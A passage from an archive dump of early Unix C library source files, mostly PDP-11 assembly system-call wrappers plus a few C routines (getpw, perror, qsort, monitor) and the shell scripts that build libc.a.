	mov	r0,_fin+2
1:
	clr	r0
	bisb	*_fin+4,r0
	inc	_fin+4
	mov	(sp)+,r5
	rts	pc

badret:
	mov	r0,_errno
	clr	r0
	clr	_fin+2
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/getcsw.s mode=0100664 uid=3 gid=3 atime=174924053 mtime=169260898 --
/ C library - getcsw

/ csw = getcsw();

.globl	_getcsw

_getcsw:
	mov	r5,-(sp)
	mov	sp,r5
	sys	38.
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/getgid.s mode=0100664 uid=3 gid=3 atime=174924056 mtime=169260898 --
/ C library -- getgid

/ gid = getgid();
/

getgid = 47.
.globl	_getgid

_getgid:
	mov	r5,-(sp)
	mov	sp,r5
	sys	getgid
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/getpid.s mode=0100664 uid=3 gid=3 atime=174924058 mtime=169260898 --
/ getpid -- get process ID

getpid	= 20.

.globl	_getpid

_getpid:
	mov	r5,-(sp)
	mov	sp,r5
	sys	getpid
	mov	(sp)+,r5
	rts	pc

-- /usr/source/s4/getpw.c mode=0100664 uid=3 gid=3 atime=174924101 mtime=169260898 --
getpw(uid, buf)
int uid;
char buf[];
{
	auto pbuf[259];
	static pwf;
	register n, c;
	register char *bp;

	if(pwf == 0)
		pwf = open("/etc/passwd", 0);
	if(pwf < 0)
		return(1);
	seek(pwf, 0, 0);
	pbuf[0] = pwf;
	pbuf[1] = 0;
	pbuf[2] = 0;
	uid =& 0377;

	for (;;) {
		bp = buf;
		while((c=getc(pbuf)) != '\n') {
			if(c <= 0)
				return(1);
			*bp++ = c;
		}
		*bp++ = '\0';
		bp = buf;
		n = 3;
		while(--n)
		while((c = *bp++) != ':')
			if(c == '\n')
				return(1);
		while((c = *bp++) != ':') {
			if(c<'0' || c>'9')
				continue;
			n = n*10+c-'0';
		}
		if(n == uid)
			return(0);
	}
	return(1);
}
-- /usr/source/s4/getuid.s mode=0100664 uid=3 gid=3 atime=174924060 mtime=169260898 --
/ C library -- getuid

/ uid = getuid();
/

.globl	_getuid

_getuid:
	mov	r5,-(sp)
	mov	sp,r5
	sys	getuid
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/gtty.s mode=0100664 uid=3 gid=3 atime=174924062 mtime=169260898 --
/ C library -- gtty

/ error = gtty(filep, ttyvec);

/ filep is descriptor of open tty
/ ttyvec[0, 1, 2] correspond to args of gtty

.globl	_gtty, cerror

_gtty:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	gtty; 0:..
-- /usr/source/s4/hmul.s mode=0100664 uid=3 gid=3 atime=174924064 mtime=169260898 --
.globl	_hmul

_hmul:
	mov	2(sp),r0
	mul	4(sp),r0
	rts	pc
-- /usr/source/s4/kill.s mode=0100664 uid=3 gid=3 atime=174924067 mtime=169260898 --
/ C library -- kill

.globl	_kill, cerror
kill = 37.
indir = 0

_kill:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(sp),r0
	mov	6(sp),8f
	sys	indir; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc

.data
9:
	sys	kill; 8:..
-- /usr/source/s4/ladd.s mode=0100664 uid=3 gid=3 atime=174924069 mtime=169260898 --
/ C routine-- long integer subtract and add

/ ladd/lsub (a, b, c);
/	int a[2], b[2], c[2];
/	a = b +- c;

.globl	_lsub
.globl	_ladd
.globl	csv
.globl	cret

_lsub:
	jsr	r5,csv
	mov	6(r5),r2
	mov	(r2)+,r0
	mov	(r2),r1
	mov	10(r5),r2
	sub	(r2)+,r0
	sub	(r2),r1
	sbc	r0
	mov	4(r5),r2
	mov	r0,(r2)+
	mov	r1,(r2)
	jmp	cret

_ladd:
	jsr	r5,csv
	mov	6(r5),r2
	mov	(r2)+,r0
	mov	(r2),r1
	mov	10(r5),r2
	add	(r2)+,r0
	add	(r2),r1
	adc	r0
	mov	4(r5),r2
	mov	r0,(r2)+
	mov	r1,(r2)
	jmp	cret
-- /usr/source/s4/ldfps.s mode=0100664 uid=3 gid=3 atime=174924071 mtime=169260898 --
ldfps = 170100^tst
/
/ ldfps(number);

.globl	_ldfps
_ldfps:
	mov	r5,-(sp)
	mov	sp,r5
	ldfps	4(r5)
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/link.s mode=0100664 uid=3 gid=3 atime=174924073 mtime=169260898 --
/ C library -- link

/ error = link(old-file, new-file);
/

.globl	_link, cerror

_link:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	link; 0:..; ..
-- /usr/source/s4/locv.s mode=0100664 uid=3 gid=3 atime=174924075 mtime=169260898 --
/ C library -- long output conversion

.globl	_locv

_locv:
	mov	r5,-(sp)
	mov	sp,r5
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	$buf,r4
	mov	6(r5),r3
	mov	4(r5),r2
	bpl	1f
	neg	r2
	neg	r3
	sbc	r2
	movb	$'-,(r4)+
1:
	jsr	pc,1f
	clrb	(r4)+
	mov	$buf,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r4
	mov	(sp)+,r5
	rts	pc

1:
	jsr	pc,divid
	add	$'0,r1
	mov	r1,-(sp)
	ashc	$0,r2
	beq	1f
	jsr	pc,1b
1:
	movb	(sp)+,(r4)+
	rts	pc

divid:
	clr	r1
	mov	$32.,r0
1:
	ashc	$1,r2
	rol	r1
	cmp	r1,$10.
	blo	2f
	sub	$10.,r1
	inc	r3
2:
	sob	r0,1b
	rts	pc


.bss
buf:	.=.+12.
-- /usr/source/s4/ltod.s mode=0100664 uid=3 gid=3 atime=174924078 mtime=169260898 --
/ C library
/ return floating-point from long integer
/	d = ltod(l)

.globl	_ltod
_ltod:
	mov	r5,-(sp)
	mov	sp,r5
	setl
	movif	*4(r5),fr0
	seti
	mov	(sp)+,r5
	rts	pc

/ return long integer from floating
/	dtol(d, l)

.globl	_dtol
_dtol:
	mov	r5,-(sp)
	mov	sp,r5
	setl
	movf	4(r5),fr0
	movfi	fr0,*12.(r5)
	seti
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/run mode=0100664 uid=3 gid=3 atime=174924109 mtime=174917288 --
as crt0.s
cmp a.out /lib/crt0.o
cp a.out /lib/crt0.o
as fcrt0.s
cmp a.out /lib/fcrt0.o
cp a.out /lib/fcrt0.o
as abort.s; mv a.out abort.o
as abs.s; mv a.out abs.o
as alloc.s; mv a.out alloc.o
as atof.s; mv a.out atof.o
as cerror.s; mv a.out cerror.o
as chdir.s; mv a.out chdir.o
as chmod.s; mv a.out chmod.o
as chown.s; mv a.out chown.o
as close.s; mv a.out close.o
as creat.s; mv a.out creat.o
as csv.s; mv a.out csv.o
as dup.s; mv a.out dup.o
as execl.s; mv a.out execl.o
as execv.s; mv a.out execv.o
as exit.s; mv a.out exit.o
as ffltpr.s; mv a.out ffltpr.o
as fltpr.s; mv a.out fltpr.o
as fork.s; mv a.out fork.o
as fstat.s; mv a.out fstat.o
as getc.s; mv a.out getc.o
as getchr.s; mv a.out getchr.o
as getcsw.s; mv a.out getcsw.o
as getgid.s; mv a.out getgid.o
as getpid.s; mv a.out getpid.o
as getuid.s; mv a.out getuid.o
as gtty.s; mv a.out gtty.o
as hmul.s; mv a.out hmul.o
as kill.s; mv a.out kill.o
as ladd.s; mv a.out ladd.o
as ldfps.s; mv a.out ldfps.o
as link.s; mv a.out link.o
as locv.s; mv a.out locv.o
as ltod.s; mv a.out ltod.o
cc -c -O *.c
ar r /lib/libc.a
rm *.o
-- /usr/source/s5 mode=0140775 uid=3 gid=3 atime=174930101 mtime=174924209 --
-- /usr/source/s5/makdir.s mode=0100664 uid=3 gid=3 atime=174924114 mtime=169260910 --
/ C library -- makdir

/ error = makdir(string);

.globl	_makdir, cerror

_makdir:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	makdir; 0:..
-- /usr/source/s5/mcount.s mode=0100664 uid=3 gid=3 atime=174924116 mtime=169260910 --
/ count subroutine calls during profiling

.globl	mcount
.comm	countbase,2

mcount:
	mov	(r0),r1
	bne	1f
	mov	countbase,r1
	beq	2f
	add	$6,countbase
	mov	(sp),(r1)+
	mov	r1,(r0)
1:
	inc	2(r1)
	bne	2f
	inc	(r1)
2:
	rts	pc

-- /usr/source/s5/mcrt0.s mode=0100664 uid=3 gid=3 atime=174924112 mtime=169260910 --
/ C runtime startoff including monitoring

cbufs	= 150.

.globl	_monitor
.globl	_sbrk
.globl	_main
.globl	_exit
.globl	_etext
.comm	countbase,2

.comm	savr5,2

start:
	setd
	mov	sp,r0
	mov	(r0),-(sp)
	tst	(r0)+
	mov	r0,2(sp)

	mov	$_etext,r1
	sub	$eprol,r1
	add	$7,r1
	ash	$-3,r1
	bic	$!17777,r1
	mov	$cbufs,-(sp)
	add	$3*[cbufs+1],r1
	mov	r1,-(sp)
	asl	r1
	mov	r1,-(sp)
	jsr	pc,_sbrk
	tst	(sp)+
	cmp	r0,$-1
	beq	9f
	mov	r0,-(sp)
	add	$6,r0
	mov	r0,countbase
	mov	$_etext,-(sp)
	mov	$eprol,-(sp)
	jsr	pc,_monitor
	add	$10.,sp
	jsr	pc,_main
	cmp	(sp)+,(sp)+
	jsr	pc,_exit

9:
	mov	$2,r0
	sys	write; 8f; 9f-8f

.data; 8: <No space for monitor buffer\n>; 9:.even; .text

_exit:
	mov	r5,-(sp)
	mov	sp,r5
	clr	-(sp)
	jsr	pc,_monitor
	tst	(sp)+
	mov	4(r5),r0
	sys	exit
eprol:
-- /usr/source/s5/mdate.s mode=0100664 uid=3 gid=3 atime=174924118 mtime=169260910 --
/ C library-- mdate

.globl	_mdate, cerror

_mdate:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),r1
	mov	(r1)+,r0
	mov	(r1),r1
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	mdate; 0:..
-- /usr/source/s5/mknod.s mode=0100664 uid=3 gid=3 atime=174924120 mtime=169260910 --
/ C library -- mknod

/ error = mknod(string, mode, major.minor);

.globl	_mknod, cerror

mknod = 14.
_mknod:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	mov	8(r5),0f+4
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	mknod; 0:..; ..; ..
-- /usr/source/s5/mon.c mode=0100664 uid=3 gid=3 atime=174924183 mtime=169260910 --
monitor(lowpc, highpc, buf, bufsiz, cntsiz)
char *lowpc, *highpc;
int *buf, bufsiz;
{
	register char *o;
	static *sbuf, ssiz;

	if (lowpc == 0) {
		profil(0, 0, 0, 0);
		o = creat("mon.out", 0666);
		write(o, sbuf, ssiz<<1);
		close(o);
		return;
	}
	if (nargs() <= 4)
		cntsiz = 0;
	ssiz = bufsiz;
	buf[0] = lowpc;
	buf[1] = highpc;
	buf[2] = cntsiz;
	sbuf = buf;
	buf =+ 3*(cntsiz+1);
	bufsiz =- 3*(cntsiz+1);
	if (bufsiz<=0)
		return;
	o = ((highpc - lowpc)>>1) & 077777;
	if(bufsiz < o)
		o = ldiv(bufsiz, 0, o<<1); else
		o = 077777;
	profil(buf, bufsiz<<1, lowpc, o<<1);
}
-- /usr/source/s5/mount.s mode=0100664 uid=3 gid=3 atime=174924122 mtime=169260910 --
/ C library -- mount

/ error = mount(dev, file, flag)

.globl	_mount, cerror

_mount:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(sp),0f
	mov	6(sp),0f+2
	mov	8(sp),0f+4
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	mount; 0:..; ..; ..
-- /usr/source/s5/nargs.s mode=0100664 uid=3 gid=3 atime=174924124 mtime=169260910 --
/ C library -- nargs

/ WARNING: this routine does not work
/ with user I&D space separate.
/ Moreover, due to a design botch in
/ the 11/45, it cannot be made to work
/ by adding mfpi instructions.

.globl	_nargs

_nargs:
	mov	r5,-(sp)
	mov	2(r5),r1		/ pc of caller of caller
	mov	sp,r5
	clr	r0
	cmp	-4(r1),jsrsd
	bne	8f
	mov	$2,r0
8:
	cmp	(r1),tsti
	bne	1f
	add	$2,r0
	br	2f
1:
	cmp	(r1),cmpi
	bne	1f
	add	$4,r0
	br	2f
1:
	cmp	(r1),addi
	bne	1f
	add	2(r1),r0
	br	2f
1:
	cmp	(r1),jmpi
	bne	1f
	add	2(r1),r1
	add	$4,r1
	br	8b
1:
	cmpb	1(r1),bri+1
	bne	2f
	mov	r0,-(sp)
	mov	(r1),r0
	swab	r0
	ash	$-7,r0
	add	r0,r1
	add	$2,r1
	mov	(sp)+,r0
	br	8b
2:
	asr	r0
	mov	(sp)+,r5
	rts	pc

.data
jsrsd:	jsr	pc,*$0
tsti:	tst	(sp)+
cmpi:	cmp	(sp)+,(sp)+
addi:	add	$0,sp
jmpi:	jmp	0
bri:	br	.
-- /usr/source/s5/nice.s mode=0100664 uid=3 gid=3 atime=174924126 mtime=169260910 --
/ C library-- nice

/ error = nice(hownice)

.globl	_nice, cerror

_nice:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(sp),r0
	sys	nice
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/nlist.s mode=0100664 uid=3 gid=3 atime=174924128 mtime=169260910 --
/ nlist -- extract values from name list
/

/	nlist(file, list);
/
.globl	_nlist

_nlist:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),r1
	mov	r2,-(sp)

	mov	r1,r0
1:
	tst	(r0)
	beq	1f
	add	$8.,r0
	clr	(r0)+
	clr	(r0)+			/ initialize to undefined
	br	1b
1:
	sys	0; 9f
.data
9:
	sys	open; 0:..; 0
.text
	bes	done
	mov	r0,r2
	sys	read; buf; 20
	cmp	r0,$20
	bne	cdone
	mov	buf+4,count			/ assume older a.out
	mov	buf+2,0f
	cmp	buf,$405
	beq	1f
	mov	buf+8.,count			/ now assume newer
	mov	buf+2,r0			/ txt
	add	buf+4,r0			/ data
	cmp	buf+16,$1			/ relocation?
	beq	4f
	asl	r0				/ txt+data reloc
4:
	add	$20,r0				/ header
	mov	r0,0f
	cmp	buf,$411
	beq	1f
	cmp	buf,$410
	beq	1f
	cmp	buf,$407
	bne	cdone
1:
	mov	r2,r0
	sys	0; 9f
.data
9:
	sys	seek; 0:..; 0
.text

1:
	sub	$12.,count
	blt	cdone
	mov	r2,r0
	sys	read; buf; 12.
	cmp	r0,$12.
	bne	cdone
	mov	r1,r0

2:
	tst	(r0)
	beq	1b
	cmp	(r0),buf
	bne	1f
	cmp	2(r0),buf+2
	bne	1f
	cmp	4(r0),buf+4
	bne	1f
	cmp	6(r0),buf+6
	bne	1f
	mov	buf+8.,8.(r0)
	mov	buf+10.,10.(r0)
1:
	add	$12.,r0
	br	2b

cdone:
	mov	r2,r0
	sys	close

done:
	mov	(sp)+,r2
	mov	(sp)+,r5
	rts	pc

.bss
buf:	.=.+20
count:	.=.+2
-- /usr/source/s5/open.s mode=0100664 uid=3 gid=3 atime=174924130 mtime=169260910 --
/ C library -- open

/ file = open(string, mode)
/
/ file == -1 means error

.globl	_open, cerror

_open:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	open; 0:..; ..
-- /usr/source/s5/perror.c mode=0100664 uid=3 gid=3 atime=174924188 mtime=169260910 --
/*
 * Print the error indicated
 * in the cerror cell.
 */

int	errno;
int	sys_nerr;
char	*sys_errlist[];
perror(s)
char *s;
{
	register char *c;
	register n;

	c = "Unknown error";
	if(errno < sys_nerr)
		c = sys_errlist[errno];
	n = strlen(s);
	if(n) {
		write(2, s, n);
		write(2, ": ", 2);
	}
	write(2, c, strlen(c));
	write(2, "\n", 1);
}

/*
 * Return the number of bytes in a string
 */

strlen(str)
char *str;
{
	register char *s;

	s = str;
	while(*s++)
		;
	return(s-str-1);
}
-- /usr/source/s5/pipe.s mode=0100664 uid=3 gid=3 atime=174924132 mtime=169260910 --
/ pipe -- C library

/	pipe(f)
/	int f[2];

.globl	_pipe, cerror

pipe = 42.

_pipe:
	mov	r5,-(sp)
	mov	sp,r5
	sys	pipe
	bec	1f
	jmp	cerror
1:
	mov	4(r5),r2
	mov	r0,(r2)+
	mov	r1,(r2)
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/printf.s mode=0100664 uid=3 gid=3 atime=174924135 mtime=169260910 --
/ C library -- printf


.globl	_printf

.globl	pfloat
.globl	pscien
.globl	_putchar

.globl	csv
.globl	cret

_printf:
	jsr	r5,csv
	sub	$126.,sp
	mov	4(r5),formp		/ format
	mov	r5,r4
	add	$6,r4			/ arglist
loop:
	movb	*formp,r0
	beq	1f
	inc	formp
	cmp	r0,$'%
	beq	2f
3:
	mov	r0,(sp)
	jsr	pc,*$_putchar
	br	loop
1:
	jmp	cret
2:
	clr	rjust
	clr	ndigit
	cmpb	*formp,$'-
	bne	2f
	inc	formp
	inc	rjust
2:
	jsr	r3,gnum
	mov	r1,width
	clr	ndfnd
	cmp	r0,$'.
	bne	1f
	jsr	r3,gnum
	mov	r1,ndigit
1:
	mov	sp,r3
	add	$4,r3
	mov	$swtab,r1
1:
	mov	(r1)+,r2
	beq	3b
	cmp	r0,(r1)+
	bne	1b
	jmp	(r2)
	.data
swtab:
	decimal;	'd
	octal;		'o
	hex;		'x
	float;		'f
	scien;		'e
	charac;		'c
	string;		's
	logical;	'l
	remote;		'r
	0;  0
	.text

decimal:
	mov	(r4)+,r1
	bge	1f
	neg	r1
	movb	$'-,(r3)+
	br	1f

logical:
	mov	(r4)+,r1
1:
	jsr	pc,1f
	br	prbuf
1:
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	movb	r0,(r3)+
	rts	pc

charac:
	movb	(r4)+,(r3)+
	bne	1f
	dec	r3
1:
	movb	(r4)+,(r3)+
	bne	prbuf
	dec	r3
	br	prbuf

string:
	mov	ndigit,r1
	clr	r3
	mov	(r4),r2
1:
	tstb	(r2)+
	beq	1f
	inc	r3
	sob	r1,1b
1:
	mov	(r4)+,r2
	br	prstr

hex:
	mov	$1f,r2
	.data
1:
	-4; !17
	.text
	br	2f

octal:
	mov	$1f,r2
	.data
1:
	-3; !7
	.text
2:
	mov	(r4)+,r1
	beq	2f
	tst	ndigit
	beq	2f
	movb	$'0,(r3)+
2:
	clr	r0
	jsr	pc,1f
	br	prbuf
1:
	mov	r1,-(sp)
	ashc	(r2),r0
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	bic	2(r2),r0
	add	$'0,r0
	cmp	r0,$'9
	ble	1f
	add	$'A-'0-10.,r0
1:
	movb	r0,(r3)+
	rts	pc

float:
	mov	ndigit,r0
	mov	ndfnd,r2
	jsr	pc,pfloat
	br	prbuf

scien:
	mov	ndigit,r0
	mov	ndfnd,r2
	jsr	pc,pscien
	br	prbuf

remote:
	mov	(r4)+,r4
	mov	(r4)+,formp
	jmp	loop

prbuf:
	mov	sp,r2
	add	$4,r2
	sub	r2,r3
prstr:
	mov	r4,-(sp)
	mov	$' ,-(sp)
	mov	r3,r4
	neg	r3
	add	width,r3
	ble	1f
	tst	rjust
	bne	1f
2:
	jsr	pc,*$_putchar
	sob	r3,2b
1:
	tst	r4
	beq	2f
1:
	movb	(r2)+,(sp)
	jsr	pc,*$_putchar
	sob	r4,1b
2:
	tst	r3
	ble	1f
	mov	$' ,(sp)
2:
	jsr	pc,*$_putchar
	sob	r3,2b
1:
	tst	(sp)+
	mov	(sp)+,r4
	jmp	loop

gnum:
	clr	ndfnd
	clr	r1
1:
	movb	*formp,r0
	inc	formp
	sub	$'0,r0
	cmp	r0,$'*-'0
	bne	2f
	mov	(r4)+,r0
	br	3f
2:
	cmp	r0,$9.
	bhi	1f
3:
	inc	ndfnd
	mul	$10.,r1
	add	r0,r1
	br	1b
1:
	add	$'0,r0
	rts	r3

.bss
width:	.=.+2
formp:	.=.+2
rjust:	.=.+2
ndfnd:	.=.+2
ndigit:	.=.+2
-- /usr/source/s5/prof.s mode=0100664 uid=3 gid=3 atime=174924137 mtime=169260911 --
/ profil

.globl	_profil
_profil:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	mov	10(r5),0f+4
	mov	12(r5),0f+6
	sys	0; 9f
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	44.; 0:..; ..; ..; ..
-- /usr/source/s5/ptrace.s mode=0100664 uid=3 gid=3 atime=174924139 mtime=169260911 --
/ ptrace -- C library

/	result = ptrace(req, pid, addr, data);

ptrace = 26.
indir = 0

.globl	_ptrace
.globl	cerror, _errno

_ptrace:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4.(r5),0f+4
	mov	6.(r5),0f+0
	mov	8.(r5),0f+2
	mov	10.(r5),r0
	clr	_errno
	sys	indir; 9f
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc

.data
9:
	sys	ptrace; 0: .=.+6
-- /usr/source/s5/putc.s mode=0100664 uid=3 gid=3 atime=174924141 mtime=169260911 --
/ putw/putc -- write words/characters on output file

	.globl	_putc, _putw, _fflush, _fcreat
	.globl cerror
	.comm	_errno,2

_fcreat:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),r1
	mov	pc,(r1)		/ a putatively illegal file desc.
	sys	0; 9f
.data
9:	sys	creat; 0:..; 666
.text
	bes	badret
	mov	r0,(r1)+
	clr	(r1)+
	clr	(r1)+
	br	goodret

_putw:
	mov	r5,-(sp)
	mov	sp,r5
	mov	6(r5),r1
	dec	2(r1)
	bge	1f
	jsr	pc,fl
	dec	2(r1)
1:
	movb	4(r5),*4(r1)
	inc	4(r1)
	dec	2(r1)
	bge	1f
	jsr	pc,fl
	dec	2(r1)
1:
	movb	5(r5),*4(r1)
	inc	4(r1)
	mov	4(r5),r0
	br	goodret

_putc:
	mov	r5,-(sp)
	mov	sp,r5
	mov	6(r5),r1
	dec	2(r1)
	bge	1f
	jsr	pc,fl
	dec	2(r1)
1:
	mov	4(r5),r0
	movb	r0,*4(r1)
	inc	4(r1)
	br	goodret

_fflush:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r1
	jsr	pc,fl
	br	goodret

fl:
	mov	r1,r0
	add	$6,r0
	mov	r0,-(sp)
	mov	r0,0f
	mov	4(r1),0f+2
	beq	1f
	sub	r0,0f+2
	mov	(r1),r0
	sys	0; 9f
.data
9:	sys	write; 0:..; ..
.text
1:
	mov	(sp)+,4(r1)
	mov	$512.,2(r1)
	rts	pc

badret:
	jmp	cerror

goodret:
	clr	_errno
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s5/putchr.s mode=0100664 uid=3 gid=3 atime=174924143 mtime=169260911 --
/ C library -- putchar

	.globl	_putchar,_flush
	.globl	_fout

_putchar:
	mov	r5,-(sp)
	mov	sp,r5
	mov	_fout+4,r0
	bne	1f
	jsr	pc,fl
	mov	_fout+4,r0
1:
	movb	4(r5),(r0)+
	beq	1f
	inc	_fout+4
	dec	_fout+2
	bgt	1f
	jsr	pc,fl
1:
	mov	4(r5),r0
	mov	(sp)+,r5
	rts	pc

_flush:
	mov	r5,-(sp)
	mov	sp,r5
	jsr	pc,fl
	mov	(sp)+,r5
	rts	pc

fl:
	mov	_fout+4,r0
	beq	1f
	sub	$_fout+6,r0
	mov	r0,0f
	mov	_fout,r0
	bne	2f
	inc	r0
2:
	sys	0; 9f
.data
9:	sys	write; _fout+6; 0:..
.text
1:
	mov	$_fout+6,_fout+4
	mov	$512.,_fout+2
	cmp	_fout,$2
	bhi	1f
	mov	$1,_fout+2
1:
	rts	pc

.bss
_fout:	.=.+518.
-- /usr/source/s5/qsort.c mode=0100664 uid=3 gid=3 atime=174924193 mtime=169260911 --

int	(*qscmp)();
int	qses;

qsort(a, n, es, fc)
char *a;
int n, es;
int (*fc)();
{
	qscmp = fc;
	qses = es;
	qs1(a, a+n*es);
}

qs1(a, l)
char *a, *l;
{
	register char *i, *j, *es;
	char *lp, *hp;
	int n, c;


	es = qses;

start:
	if((n=l-a) <= es)
		return;


	n = ((n/(2*es))*es) & 077777;
	hp = lp = a+n;
	i = a;
	j = l-es;


	for(;;) {
		if(i < lp) {
			if((c = (*qscmp)(i, lp)) == 0) {
				qsexc(i, lp =- es);
				continue;
			}
			if(c < 0) {
				i =+ es;
				continue;
			}
		}

loop:
		if(j > hp) {
			if((c = (*qscmp)(hp, j)) == 0) {
				qsexc(hp =+ es, j);
				goto loop;
			}
			if(c > 0) {
				if(i == lp) {
					qstexc(i, hp =+ es, j);
					i = lp =+ es;
					goto loop;
				}
				qsexc(i, j);
				j =- es;
				i =+ es;
				continue;
			}
			j =- es;
			goto loop;
		}


		if(i == lp) {
			if(lp-a >= l-hp) {
				qs1(hp+es, l);
				l = lp;
			} else {
				qs1(a, lp);
				a = hp+es;
			}
			goto start;
		}


		qstexc(j, lp =- es, i);
		j = hp =- es;
	}
}

qsexc(i, j)
char *i, *j;
{
	register char *ri, *rj, c;
	int n;

	n = qses;
	ri = i;
	rj = j;
	do {
		c = *ri;
		*ri++ = *rj;
		*rj++ = c;
	} while(--n);
}

qstexc(i, j, k)
char *i, *j, *k;
{
	register char *ri, *rj, *rk;
	char	c;
	int	n;

	n = qses;
	ri = i;
	rj = j;
	rk = k;
	do {
		c = *ri;
		*ri++ = *rk;
		*rk++ = *rj;
		*rj++ = c;
	} while(--n);
}
-- /usr/source/s5/read.s mode=0100664 uid=3 gid=3 atime=174924145 mtime=169260911 --
/ C library -- read

/ nread = read(file, buffer, count);
/
/ nread ==0 means eof; nread == -1 means error

.globl	_read, cerror

_read:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	mov	8(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	read; 0:..; ..
-- /usr/source/s5/reset.s mode=0100664 uid=3 gid=3 atime=174924147 mtime=169260911 --
/ C library -- reset, setexit

/	reset()
/ will generate a "return" from
/ the last call to
/	setexit()
/ by restoring sp, r5
/ and doing a return.
/
/ useful for going back to the main loop
/ after a horrible error in a lowlevel
/ routine.

.globl	_setexit
.globl	_reset
.globl	csv, cret

_setexit:
	jsr	r5,csv
	mov	r5,sr5
	mov	2(r5),spc
	jmp	cret

_reset:
	mov	sr5,r5
	mov	spc,2(r5)
	jmp	cret

.bss
sr5:	.=.+2
spc:	.=.+2
-- /usr/source/s5/rin.c mode=0100664 uid=3 gid=3 atime=174924200 mtime=169260911 --
rin()
{
	double d;
	register n, c, f;

	d = 0.;
	f = 0;
	n = 0;
loop:
	c = getchar();
	if(c == '\0')
		exit();
	if(c == '-') {
		f++;
		goto loop;
	}
	if(c == '.') {
		n++;
		goto loop;
	}
	if(c>='0' && c<='9') {
		if(n)
			n++;
		d = d*10.+c-'0';
		goto loop;
	}
	if(f)
		d = -d;
	for(f=1; f<n; f++)
		d =/ 10.;
	n = d;
	return(n);
}
-- /usr/source/s5/run mode=0100664 uid=3 gid=3 atime=174924208 mtime=174917290 --
as mcrt0.s
cmp a.out /lib/mcrt0.o
cp a.out /lib/mcrt0.o
as makdir.s; mv a.out makdir.o
as mcount.s; mv a.out mcount.o
as mdate.s; mv a.out mdate.o
as mknod.s; mv a.out mknod.o
as mount.s; mv a.out mount.o
as nargs.s; mv a.out nargs.o
as nice.s; mv a.out nice.o
as nlist.s; mv a.out nlist.o
as open.s; mv a.out open.o
as pipe.s; mv a.out pipe.o
as printf.s; mv a.out printf.o
as prof.s; mv a.out prof.o
as ptrace.s; mv a.out ptrace.o
as putc.s; mv a.out putc.o
as putchr.s; mv a.out putchr.o
as read.s; mv a.out read.o
as reset.s; mv a.out reset.o
as sbrk.s; mv a.out sbrk.o
as seek.s; mv a.out seek.o
as setgid.s; mv a.out setgid.o
as setuid.s; mv a.out setuid.o
as signal.s; mv a.out signal.o
as sleep.s; mv a.out sleep.o
as stat.s; mv a.out stat.o
as stime.s; mv a.out stime.o
as stty.s; mv a.out stty.o
as sync.s; mv a.out sync.o
as time.s; mv a.out time.o
as times.s; mv a.out times.o
as umount.s; mv a.out umount.o
as unlink.s; mv a.out unlink.o
as wait.s; mv a.out wait.o
as write.s; mv a.out write.o
cc -c -O mon.c perror.c qsort.c
cc -c -f -O rin.c
ar r /lib/libc.a
rm *.o
-- /usr/source/s5/sbrk.s mode=0100664 uid=3 gid=3 atime=174924149 mtime=169260911 --
/old = sbrk(increment);
/
/sbrk gets increment more core, and returns a pointer
/	to the beginning of the new core area
/
.globl	_sbrk,_end, cerror

_sbrk:
	mov	r5,-(sp)
	mov	sp,r5
	mov	nd,0f
	add	4(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	nd,r0
	add	4(r5),nd
